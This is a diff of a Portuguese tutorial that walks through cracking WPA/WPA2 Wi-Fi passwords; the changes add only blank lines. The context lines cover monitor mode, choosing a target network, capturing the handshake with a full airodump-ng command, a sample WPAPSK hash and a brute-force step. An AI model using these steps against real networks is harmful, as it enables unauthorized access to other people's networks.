@@ -27,6 +27,7 @@ phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
 
 
 
+
 # Segundo passo:
 Colocar seu interface em monitor mode
 
@@ -58,6 +59,8 @@ phy0	wlan0mon	ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
 ($ ifconfig ou $ iwconfig para confirmar que a interface esta em monitor-mode)
 
 
+
+
 # Terceiro passo
 "Sniffar" redes em volta para identificar seu alvo
 
@@ -87,11 +90,15 @@ A saida sera parecida com essa:
  STATION = Mac Address de dispositivos conectados aos APs
  ####################################
  
+ 
+ 
+ 
  # Quarto passo
  Depois de identificar o alvo, começar o captura dos pacotes da rede para então pegar o HANDSHAKE
  
  $ sudo airodump-ng --bssid <macaddr> --channel <canal> -w <arquivo> <interface>
  (--channel para evitar perda de pacotes,  -w para gravar captura em um arquivo)
+ 
  
  
  
@@ -115,6 +122,7 @@ A saida sera parecida com essa:
  
  
  
+ 
  # Sexto passo
  Se der certo o Quinto passo, na terminal do airodump-ng capturando os pacotes
  ira aparecer a seguinte mensagem [ WPA handshake: 00:14:6C:7E:40:80
@@ -129,6 +137,7 @@ A saida sera parecida com essa:
  
  
  # Se você verifcar o diretorio atual, vera alguns arquivos incluindo a captura do trafego( arquivo.cap)
+ 
  
  
  
@@ -149,7 +158,8 @@ A saida sera parecida com essa:
  No arquivo ficara um hash dessa forma: 
  ESSID:$WPAPSK$ESSID#x3EU5Y3o1jRkE5hTM0qamIqSFyApa7cBSX5AZFNCidtAkKPdtQ1uyW2Hv1z8s4BrRP7aFIZy19Jsvy9hMhX5O8FRp2P1UaDjQ8MpZE21.5I0.Ec.............M0qamIqSFyApa7cBSX5AZFNCidtAkKPdtQ1uyW2Hv1w.................................................................3X.I.E..1uk2.E..1uk2.E..1uk0....................................................................................................................................................................................../t.....U...5Imr/ewzRUT2b9IE63q1mc:0ef770407b5f:f454201e4174:f454201e4174::WPA2, verified:arquivo.cap
  
- 
+
+
 
 # Oitavo passo (não pensei que teria tantos passos :) ) 
 Com o hash em mãos é só fazer o brute-force 
